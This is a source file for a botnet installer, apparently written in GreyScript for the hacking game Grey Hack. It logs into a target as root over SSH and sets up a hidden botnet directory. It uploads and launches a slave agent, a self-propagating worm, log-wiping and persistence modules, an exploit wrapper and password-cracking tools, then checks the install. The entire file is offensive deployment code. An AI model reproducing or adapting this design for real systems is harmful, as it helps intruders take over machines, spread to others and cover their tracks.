// installer.gs - Bootstrap script for botnet deployment
// Handles complete initial setup with error checking

import_code("/lib/kyber_lib.gs")
import_code("/lib/lib_common.gs")
import_code("/scripts/utils/config_manager.gs")
import_code("/scripts/utils/metrics.gs")
import_code("/scripts/utils/sanitize_ip.gs")

// ============================================
// Installer Configuration
// ============================================

if params.len < 2 then
    print("Usage: installer.gs <target_ip> <root_password> [depth]")
    print("Example: installer.gs 192.168.1.100 password123 3")
    exit()
end if

target_ip = params[0]
root_pass = params[1]
depth = 3
if params.len >= 3 then
    depth = params[2].to_int
    if typeof(depth) != "number" or depth < 1 or depth > 5 then
        depth = 3
    end if
end if

target_ip_safe = sanitize_ip(target_ip)

// ============================================
// Connection and Validation
// ============================================

print("Connecting to " + target_ip_safe + "...")

shell = get_shell.connect_service(target_ip, 22, "root", root_pass)
if shell == null then
    print("ERROR: Cannot connect to " + target_ip_safe)
    exit()
end if

print("Connected to " + target_ip_safe)

// Verify root access
level = accessLevel(shell)
if level != "root" then
    print("ERROR: Insufficient privileges (got: " + level + ")")
    shell.close
    exit()
end if

// ============================================
// Directory Structure Creation
// ============================================

print("Creating directory structure...")

directories = [
    "/root/.botnet",
    "/root/.botnet/commands", 
    "/root/.botnet/responses",
    "/root/.botnet/depth_markers",
    "/bin",
    "/lib",
    "/scripts/utils",
    "/scripts/utils/forensics",
    "/scripts/tools/recon",
    "/scripts/tools/password"
]

for dir in directories
    result = shell.run("mkdir -p " + dir)
    if typeof(result) == "string" then
        print("WARNING: Failed to create " + dir + ": " + result)
    end if
end for

// ============================================
// File Upload
// ============================================

print("Uploading botnet files...")

// Core files
core_files = [
    "/bin/slave.gs",
    "/bin/worm.gs", 
    "/lib/kyber_lib.gs",
    "/lib/lib_common.gs"
]

// Utility files
util_files = [
    "/scripts/utils/config_manager.gs",
    "/scripts/utils/metrics.gs",
    "/scripts/utils/kyber_transport.gs",
    "/scripts/utils/forensics/persistence.gs",
    "/scripts/utils/forensics/wipe_logs.gs",
    "/scripts/utils/forensics/watchdog_randomizer.gs",
    "/scripts/utils/accessLevel.gs",
    "/scripts/utils/parse_exploit_requirements.gs",
    "/scripts/utils/sanitize_ip.gs",
    "/scripts/utils/find_lib.gs",
    "/scripts/utils/file_search.gs"
]

// Exploit files
exploit_files = [
    "/scripts/exploit/metaxploit_wrapper.gs"
]

// Tool files
tool_files = [
    "/scripts/tools/password/chainsaw_v2.gs",
    "/scripts/tools/recon/banner_grab_mini.gs",
    "/scripts/tools/recon/network_map_mini.gs",
    "/scripts/tools/recon/recon_ports_mini.gs",
    "/scripts/tools/recon/smtp_enum_mini.gs",
    "/scripts/tools/recon/whois_lookup_mini.gs"
]

// Upload all files
all_files = core_files + util_files + exploit_files + tool_files
uploaded = 0
failed = 0

for file_path in all_files
    local_file = get_shell.host_computer.File(file_path)
    if local_file == null then
        print("WARNING: Source file not found: " + file_path)
        failed = failed + 1
        continue
    end if
    
    // Determine destination
    if file_path.indexOf("/bin/") == 0 then
        dest = file_path
    else if file_path.indexOf("/lib/") == 0 then
        dest = file_path
    else
        dest = file_path  // Keep full path for scripts
    end if
    
    result = get_shell.scp(file_path, dest, shell)
    if typeof(result) == "string" then
        print("WARNING: Failed to upload " + file_path + ": " + result)
        failed = failed + 1
    else
        uploaded = uploaded + 1
    end if
end for

print("Uploaded " + str(uploaded) + " files, " + str(failed) + " failed")

// ============================================
// Master Public Key Setup
// ============================================

print("Setting up master public key...")

master_pub = safe_file_read("/root/.botnet/master.pub")
if master_pub != null then
    result = get_shell.scp("/root/.botnet/master.pub", "/root/.botnet/master.pub", shell)
    if typeof(result) == "string" then
        print("WARNING: Failed to upload master public key")
    else
        print("Master public key uploaded")
    end if
else
    print("WARNING: No master public key found locally")
end if

// ============================================
// File Permissions
// ============================================

print("Setting file permissions...")

executable_files = ["/bin/slave.gs", "/bin/worm.gs"]
for exec_file in executable_files
    shell.run("chmod +x " + exec_file)
end for

// Set restrictive permissions on botnet directory
shell.run("chmod 700 /root/.botnet")
shell.run("chmod 600 /root/.botnet/*")

// ============================================
// Configuration Initialization
// ============================================

print("Initializing configuration...")

// Create initial config on target
config_init = shell.run("/bin/slave.gs config_init")
if typeof(config_init) == "string" then
    print("WARNING: Config initialization failed: " + config_init)
end if

// ============================================
// Service Launch
// ============================================

print("Launching botnet services...")

// Launch slave agent
slave_pid = shell.launch("/bin/slave.gs")
if typeof(slave_pid) == "number" then
    print("Slave agent launched (PID: " + str(slave_pid) + ")")
else
    print("WARNING: Failed to launch slave agent")
end if

// Optional: Launch worm if depth specified
if depth > 0 then
    print("Launching worm with depth " + str(depth) + "...")
    worm_args = ["/root/.botnet/master.pub", str(depth), target_ip]
    worm_pid = shell.launch("/bin/worm.gs", worm_args)
    if typeof(worm_pid) == "number" then
        print("Worm launched (PID: " + str(worm_pid) + ")")
    else
        print("WARNING: Failed to launch worm")
    end if
end if

// Launch persistence
shell.run("/bin/slave.gs persistence_install")

// ============================================
// Verification
// ============================================

print("Verifying installation...")

// Check if slave is running
procs = shell.host_computer.show_procs
slave_running = false
if procs != null then
    for proc in procs
        if proc != null and proc.name == "slave.gs" then
            slave_running = true
            break
        end if
    end for
end if

if slave_running then
    print("Slave agent is running")
else
    print("Slave agent not detected")
end if

// Check botnet directory
botnet_dir = shell.host_computer.File("/root/.botnet")
if botnet_dir != null then
    print("Botnet directory exists")
else
    print("Botnet directory missing")
end if

// Check key files
key_files = ["/root/.botnet/slave.priv", "/root/.botnet/slave.pub"]
for key_file in key_files
    f = shell.host_computer.File(key_file)
    if f != null then
        print(key_file + " exists")
    else
        print(key_file + " missing")
    end if
end for

// ============================================
// Cleanup
// ============================================

shell.close

print("")
print("=== Installation Summary ===")
print("Target: " + target_ip_safe)
print("Files uploaded: " + str(uploaded))
print("Files failed: " + str(failed))
print("Depth: " + str(depth))
if slave_running then
    print("Status: SUCCESS")
else
    print("Status: PARTIAL")
end if
print("")
print("Botnet installation complete!")
print("Use master_controller.gs to manage the botnet.")
